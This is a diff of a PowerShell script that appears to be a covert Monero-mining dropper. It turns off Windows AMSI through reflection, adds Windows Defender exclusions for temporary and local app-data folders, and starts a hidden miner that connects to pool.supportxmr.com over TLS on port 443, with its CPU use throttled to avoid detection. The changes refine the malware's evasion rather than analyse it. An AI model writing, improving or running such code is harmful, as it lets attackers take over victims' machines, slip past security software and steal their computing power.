@@ -65,11 +65,6 @@ try {
     $am=([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed','NonPublic,Static')
     if ($am) { $am.SetValue($null, $true) }
 } catch {}
-try {
-    $w=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::GetExecutingAssembly().GetModules()[0])
-    $p=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress "amsi.dll" "AmsiScanBuffer"),[Func[IntPtr,Int32,String,IntPtr,IntPtr,IntPtr,Int32]])
-    # Additional memory patching logic would go here if needed
-} catch {}
 
 # === HW DETECTION (Enhanced) ===
 $hw = @{ gpu = $false; gpuName = 'None'; cpuName = 'Unknown'; cores = 2; ram = 0 }
@@ -90,6 +85,9 @@ try {
         }
     }
 } catch {}
+
+# Define exclusion paths BEFORE using them
+$exPaths = @($env:TEMP, $env:LOCALAPPDATA, $writableDir, "$env:LOCALAPPDATA\Microsoft")
 
 # Defender exclusion in background — don't block main thread
 Start-Job -ScriptBlock {
@@ -235,7 +233,7 @@ Start-Sleep -Seconds 10
 
 # === LAUNCH MINERS ===
 if (Test-Path $cpuExe) {
-    $cpuArgs = "-o pool.supportxmr.com:3333 -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1"
+    $cpuArgs = "-o pool.supportxmr.com:443 --tls -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1"
     $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0
     # Retry once if launch failed
     if (!$cpuProc) { Start-Sleep 3; $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru -EA 0 }
